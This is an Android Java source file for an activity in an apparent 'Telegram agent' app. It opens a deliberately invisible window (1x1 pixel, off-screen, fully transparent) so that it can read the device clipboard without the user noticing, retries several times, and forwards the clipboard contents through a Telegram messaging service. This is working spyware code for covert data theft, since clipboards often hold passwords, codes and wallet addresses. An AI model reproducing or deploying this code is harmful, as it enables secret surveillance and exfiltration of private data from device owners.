package com.thunderx.telegramagent;

import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.graphics.PixelFormat;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;

public class ClipboardReaderActivity extends Activity {

    private static final String TAG = "ClipboardReader";
    private int attempts = 0;
    private static final int MAX_ATTEMPTS = 6;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // ==========================================================
        //  Make the window INVISIBLE to the user
        //  but still "visible" to the Android system (for focus)
        // ==========================================================
        try {
            Window window = getWindow();
            if (window != null) {
                // Transparent background
                window.setBackgroundDrawableResource(android.R.color.transparent);
                window.setFormat(PixelFormat.TRANSLUCENT);
                window.addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL);
                window.addFlags(WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS);
                window.clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND);
                window.setDimAmount(0f);

                // 1x1 pixel, off-screen, fully transparent
                WindowManager.LayoutParams params = window.getAttributes();
                params.gravity = Gravity.TOP | Gravity.START;
                params.x = -1000;
                params.y = -1000;
                params.width = 1;
                params.height = 1;
                params.alpha = 0f;
                params.dimAmount = 0f;
                window.setAttributes(params);

                // Hide the status bar / navigation
                window.addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
            }
        } catch (Exception e) {
            Log.e(TAG, "window setup error: " + e.getMessage());
        }

        // Set an empty transparent view
        getWindow().setContentView(new android.view.View(this));

        // Give Android ~200ms to grant focus, then read
        new Handler(Looper.getMainLooper()).postDelayed(this::tryReadClipboard, 200);
    }

    private void tryReadClipboard() {
        attempts++;
        Log.d(TAG, "Attempt " + attempts);

        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            if (cm == null) {
                if (attempts < MAX_ATTEMPTS) { retry(); return; }
                finish();
                return;
            }

            if (!cm.hasPrimaryClip()) {
                if (attempts < MAX_ATTEMPTS) { retry(); return; }
                TelegramAgentService.sendMessage("📋 Clipboard is empty.");
                finish();
                return;
            }

            ClipData clip = cm.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) {
                if (attempts < MAX_ATTEMPTS) { retry(); return; }
                TelegramAgentService.sendMessage("📋 Clipboard is empty.");
                finish();
                return;
            }

            CharSequence text = clip.getItemAt(0).coerceToText(this);
            String content = (text != null) ? text.toString() : "";

            if (content.length() > 0) {
                String safe = content
                        .replace("_", "\\_")
                        .replace("*", "\\*")
                        .replace("`", "\\`")
                        .replace("[", "\\[");
                TelegramAgentService.sendMessage("📋 *Clipboard:*\n\n" + safe);
                finish();
            } else {
                if (attempts < MAX_ATTEMPTS) { retry(); return; }
                TelegramAgentService.sendMessage("📋 Clipboard is empty.");
                finish();
            }

        } catch (Exception e) {
            Log.e(TAG, "read error: " + e.getMessage());
            if (attempts < MAX_ATTEMPTS) { retry(); return; }
            TelegramAgentService.sendMessage("❌ Clipboard error: " + e.getMessage());
            finish();
        }
    }

    private void retry() {
        new Handler(Looper.getMainLooper()).postDelayed(this::tryReadClipboard, 150);
    }
}